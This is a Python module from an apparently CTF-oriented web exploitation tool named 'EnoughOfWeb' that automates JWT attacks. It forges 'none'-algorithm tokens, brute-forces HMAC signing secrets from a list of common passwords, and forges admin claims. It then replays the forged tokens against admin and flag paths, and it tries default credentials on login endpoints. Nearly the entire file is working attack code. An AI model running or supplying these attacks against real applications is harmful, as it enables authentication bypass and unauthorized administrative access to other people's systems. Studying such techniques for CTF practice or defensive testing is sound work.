"""
EnoughOfWeb — JWT Attack Module
Attacks: none algorithm, weak secret brute-force, claim manipulation.
"""

import re
import json
import base64
import hashlib
import hmac
from typing import List, Optional, Dict
from urllib.parse import urljoin

from modules.base import BaseExploit, Finding, ExploitResult, Severity


# ---------------------------------------------------------------------------
# Common JWT secrets for brute-forcing
# ---------------------------------------------------------------------------

COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "key", "jwt_secret",
    "supersecret", "changeme", "letmein", "password1", "123456789",
    "12345", "1234", "qwerty", "abc123", "monkey", "dragon",
    "master", "login", "princess", "welcome", "shadow", "sunshine",
    "trustno1", "iloveyou", "batman", "access", "hello", "charlie",
    "test", "jwt", "token", "mysecret", "secret123", "password123",
    "s3cr3t", "s3cret", "passw0rd", "p@ssw0rd", "p@ssword",
    "default", "guest", "public", "private", "HS256", "HS384", "HS512",
    "the-secret", "my-secret", "your-secret", "jwt-secret",
    "secret-key", "secretkey", "jwt_secret_key", "app_secret",
    "flask-secret", "django-secret", "express-secret", "node-secret",
    "hmac-secret", "hmac_secret", "hmac256", "auth_secret",
    "api_secret", "api-secret", "apikey", "api_key",
    "AllYourBase", "flag", "ctf", "hack", "root", "toor",
    "keyboard", "zxcvbn", "asdfgh", "qazwsx", "123qwe",
    "", "null", "none", "undefined", "true", "false",
    "gKt4LPLJzAMCk0Q", "HMAC", "signing_key", "jwt123",
    "YOUR-256-BIT-SECRET", "your-256-bit-secret",
    "MIIEvgIBADANBg",  # partial RSA key (common mistake)
]

# Interesting JWT claim manipulations
CLAIM_MUTATIONS = [
    {"field": "role", "values": ["admin", "administrator", "root", "superuser", "superadmin"]},
    {"field": "admin", "values": [True, 1, "true", "yes"]},
    {"field": "is_admin", "values": [True, 1, "true"]},
    {"field": "isAdmin", "values": [True, 1, "true"]},
    {"field": "user", "values": ["admin", "administrator", "root"]},
    {"field": "username", "values": ["admin", "administrator", "root"]},
    {"field": "sub", "values": ["admin", "administrator", "root", "0", "1"]},
    {"field": "uid", "values": [0, 1, "0", "1"]},
    {"field": "user_id", "values": [0, 1, "0", "1"]},
    {"field": "privilege", "values": ["admin", "root", "high"]},
    {"field": "access", "values": ["admin", "full", "all"]},
    {"field": "group", "values": ["admin", "administrators", "root"]},
    {"field": "iss", "values": ["admin", "self"]},
]

# Paths to test with manipulated tokens
PROTECTED_PATHS = [
    "/admin", "/dashboard", "/panel", "/api/admin",
    "/api/flag", "/flag", "/api/secret", "/secret",
    "/api/users", "/api/data", "/protected",
    "/api/v1/admin", "/api/v1/flag",
    "/admin/flag", "/admin/dashboard",
]


class JWTExploit(BaseExploit):
    name = "jwt"
    description = "JWT attacks — none algorithm, weak secret, claim manipulation"
    priority = 6

    def detect(self, target_url: str, recon_data: dict) -> List[Finding]:
        findings: List[Finding] = []

        # Look for JWTs in cookies
        cookies = recon_data.get("cookies", {})
        for name, value in cookies.items():
            if self._is_jwt(value):
                findings.append(Finding(
                    module=self.name,
                    vuln_type="jwt-detected",
                    target_url=target_url,
                    parameter=name,
                    method="COOKIE",
                    payload=value,
                    evidence=f"JWT found in cookie '{name}'",
                    severity=Severity.MEDIUM,
                    extra={
                        "location": "cookie",
                        "cookie_name": name,
                        "jwt": value,
                    },
                ))

        # Look for JWTs in headers
        headers = recon_data.get("headers", {})
        for name, value in headers.items():
            if name.lower() in ("authorization", "x-access-token", "x-auth-token", "token"):
                token = value.replace("Bearer ", "").replace("bearer ", "").strip()
                if self._is_jwt(token):
                    findings.append(Finding(
                        module=self.name,
                        vuln_type="jwt-detected",
                        target_url=target_url,
                        parameter=name,
                        method="HEADER",
                        payload=token,
                        evidence=f"JWT found in header '{name}'",
                        severity=Severity.MEDIUM,
                        extra={
                            "location": "header",
                            "header_name": name,
                            "jwt": token,
                        },
                    ))

        # If no JWT found, try to get one by making requests
        if not findings:
            jwt_token = self._find_jwt_in_responses(target_url, recon_data)
            if jwt_token:
                findings.append(Finding(
                    module=self.name,
                    vuln_type="jwt-detected",
                    target_url=target_url,
                    parameter="token",
                    method="RESPONSE",
                    payload=jwt_token["token"],
                    evidence=f"JWT found in response at {jwt_token['source']}",
                    severity=Severity.MEDIUM,
                    extra={
                        "location": jwt_token["location"],
                        "jwt": jwt_token["token"],
                        "source": jwt_token["source"],
                    },
                ))

        return findings

    def exploit(self, finding: Finding) -> ExploitResult:
        try:
            jwt_token = finding.extra.get("jwt", finding.payload)
            results = []

            # 1. Try none algorithm attack
            result = self._attack_none_algorithm(finding, jwt_token)
            if result and result.flag:
                return result
            if result and result.success:
                results.append(result)

            # 2. Try weak secret brute-force
            result = self._attack_weak_secret(finding, jwt_token)
            if result and result.flag:
                return result
            if result and result.success:
                results.append(result)

            # 3. Try claim manipulation (if we found the secret or none algo works)
            for r in results:
                if r.extra_secret:
                    result = self._attack_claim_manipulation(finding, jwt_token, r.extra_secret)
                    if result and result.flag:
                        return result

            # Return best result
            if results:
                return results[0]

            return ExploitResult(success=False, error="No JWT attacks succeeded")
        except Exception as e:
            return ExploitResult(success=False, error=str(e))

    # ------------------------------------------------------------------
    # JWT parsing helpers (no PyJWT dependency needed for basic operations)
    # ------------------------------------------------------------------

    def _is_jwt(self, token: str) -> bool:
        """Check if a string looks like a JWT."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return False
        try:
            self._b64decode(parts[0])
            self._b64decode(parts[1])
            return True
        except Exception:
            return False

    def _b64decode(self, data: str) -> bytes:
        """Base64url decode."""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    def _b64encode(self, data: bytes) -> str:
        """Base64url encode without padding."""
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")

    def _decode_jwt(self, token: str) -> tuple:
        """Decode JWT without verification. Returns (header, payload, signature)."""
        parts = token.split(".")
        header = json.loads(self._b64decode(parts[0]))
        payload = json.loads(self._b64decode(parts[1]))
        signature = parts[2]
        return header, payload, signature

    def _encode_jwt(self, header: dict, payload: dict, secret: str = "", algorithm: str = "HS256") -> str:
        """Encode a JWT token."""
        header_b64 = self._b64encode(json.dumps(header, separators=(",", ":")).encode())
        payload_b64 = self._b64encode(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{header_b64}.{payload_b64}"

        if algorithm.lower() == "none" or algorithm == "":
            signature = ""
        elif algorithm == "HS256":
            signature = self._b64encode(
                hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
            )
        elif algorithm == "HS384":
            signature = self._b64encode(
                hmac.new(secret.encode(), signing_input.encode(), hashlib.sha384).digest()
            )
        elif algorithm == "HS512":
            signature = self._b64encode(
                hmac.new(secret.encode(), signing_input.encode(), hashlib.sha512).digest()
            )
        else:
            signature = ""

        return f"{header_b64}.{payload_b64}.{signature}"

    def _verify_hs256(self, token: str, secret: str) -> bool:
        """Verify HS256 signature."""
        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}"
        expected_sig = self._b64encode(
            hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
        )
        return hmac.compare_digest(expected_sig, parts[2])

    # ------------------------------------------------------------------
    # Attack methods
    # ------------------------------------------------------------------

    def _attack_none_algorithm(self, finding: Finding, jwt_token: str) -> Optional[ExploitResult]:
        """Try the 'none' algorithm attack."""
        try:
            header, payload, _ = self._decode_jwt(jwt_token)
        except Exception:
            return None

        none_variants = ["none", "None", "NONE", "nOnE", "noNe"]
        url = finding.target_url

        for none_alg in none_variants:
            forged_header = dict(header)
            forged_header["alg"] = none_alg

            # Try with empty signature
            forged_token = self._encode_jwt(forged_header, payload, algorithm="none")

            # Also try with admin claims
            admin_payload = dict(payload)
            admin_mutations = [
                {"role": "admin"},
                {"admin": True},
                {"is_admin": True},
                {"isAdmin": True},
            ]

            tokens_to_try = [forged_token]
            for mutation in admin_mutations:
                mutated = dict(admin_payload)
                mutated.update(mutation)
                tokens_to_try.append(self._encode_jwt(forged_header, mutated, algorithm="none"))

            for token in tokens_to_try:
                result = self._try_token(finding, token, url)
                if result:
                    result.technique = "jwt-none-algorithm"
                    result.payload_used = token
                    return result

        return None

    def _attack_weak_secret(self, finding: Finding, jwt_token: str) -> Optional[ExploitResult]:
        """Brute-force common weak secrets."""
        try:
            header, payload, signature = self._decode_jwt(jwt_token)
        except Exception:
            return None

        alg = header.get("alg", "HS256")
        if alg not in ("HS256", "HS384", "HS512"):
            return None

        for secret in COMMON_SECRETS:
            try:
                test_token = self._encode_jwt(header, payload, secret=secret, algorithm=alg)
                if test_token.split(".")[2] == jwt_token.split(".")[2]:
                    # Found the secret!
                    result = ExploitResult(
                        success=True,
                        payload_used=f"secret={secret}",
                        technique="jwt-weak-secret",
                        data_extracted=f"JWT secret cracked: '{secret}'. Claims: {json.dumps(payload)}",
                    )
                    result.extra_secret = secret  # type: ignore
                    return result
            except Exception:
                continue

        return None

    def _attack_claim_manipulation(self, finding: Finding, jwt_token: str, secret: str) -> Optional[ExploitResult]:
        """Manipulate claims using a known secret."""
        try:
            header, payload, _ = self._decode_jwt(jwt_token)
        except Exception:
            return None

        alg = header.get("alg", "HS256")
        url = finding.target_url

        for mutation in CLAIM_MUTATIONS:
            field = mutation["field"]
            for value in mutation["values"]:
                forged_payload = dict(payload)
                forged_payload[field] = value

                forged_token = self._encode_jwt(header, forged_payload, secret=secret, algorithm=alg)
                result = self._try_token(finding, forged_token, url)
                if result:
                    result.technique = "jwt-claim-manipulation"
                    result.payload_used = f"{field}={value} (secret={secret})"
                    return result

        return None

    def _try_token(self, finding: Finding, token: str, base_url: str) -> Optional[ExploitResult]:
        """Try a forged token against the target and protected paths."""
        location = finding.extra.get("location", "cookie")
        cookie_name = finding.extra.get("cookie_name", "token")
        header_name = finding.extra.get("header_name", "Authorization")

        paths_to_try = [""] + PROTECTED_PATHS

        for path in paths_to_try:
            url = urljoin(base_url, path) if path else base_url

            try:
                if location == "cookie":
                    resp = self._request("GET", url, cookies={cookie_name: token})
                elif location == "header":
                    if header_name.lower() == "authorization":
                        resp = self._request("GET", url, headers={header_name: f"Bearer {token}"})
                    else:
                        resp = self._request("GET", url, headers={header_name: token})
                else:
                    # Try both cookie and header
                    resp = self._request("GET", url, cookies={"token": token, "jwt": token, "session": token})
            except Exception:
                continue

            if resp is None:
                continue

            flag = self._check_flag(resp.text)
            if flag:
                return ExploitResult(
                    success=True,
                    flag=flag,
                    raw_response=resp.text[:2000],
                )

            # Check for successful admin access indicators
            if resp.status_code == 200 and any(kw in resp.text.lower() for kw in
                                                ["admin", "dashboard", "flag", "secret", "welcome"]):
                flag = self._check_flag(resp.text)
                if flag:
                    return ExploitResult(
                        success=True,
                        flag=flag,
                        raw_response=resp.text[:2000],
                    )

        return None

    def _find_jwt_in_responses(self, target_url: str, recon_data: dict) -> Optional[dict]:
        """Try to obtain a JWT by logging in or visiting common endpoints."""
        # Try common login with default creds
        login_paths = ["/login", "/api/login", "/auth/login", "/api/auth/login", "/signin", "/api/signin"]
        creds = [
            {"username": "guest", "password": "guest"},
            {"username": "user", "password": "password"},
            {"username": "test", "password": "test"},
            {"username": "admin", "password": "admin"},
        ]

        for path in login_paths:
            url = urljoin(target_url, path)
            for cred in creds:
                try:
                    # Try JSON
                    resp = self._request("POST", url, json=cred)
                    token = self._extract_jwt_from_response(resp)
                    if token:
                        return {"token": token, "location": "response-body", "source": url}

                    # Try form data
                    resp = self._request("POST", url, data=cred)
                    token = self._extract_jwt_from_response(resp)
                    if token:
                        return {"token": token, "location": "response-body", "source": url}
                except Exception:
                    continue

        # Check main page for JWTs
        try:
            resp = self._request("GET", target_url)
            token = self._extract_jwt_from_response(resp)
            if token:
                return {"token": token, "location": "main-page", "source": target_url}
        except Exception:
            pass

        return None

    def _extract_jwt_from_response(self, resp) -> Optional[str]:
        """Extract JWT from response body, headers, or cookies."""
        if resp is None:
            return None

        # Check response body
        jwt_pattern = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")
        match = jwt_pattern.search(resp.text)
        if match and self._is_jwt(match.group(0)):
            return match.group(0)

        # Check headers
        for name in ["Authorization", "X-Access-Token", "X-Auth-Token", "Token"]:
            value = resp.headers.get(name, "")
            token = value.replace("Bearer ", "").strip()
            if token and self._is_jwt(token):
                return token

        # Check set-cookie
        for cookie_name, cookie_value in resp.cookies.items():
            if self._is_jwt(cookie_value):
                return cookie_value

        return None
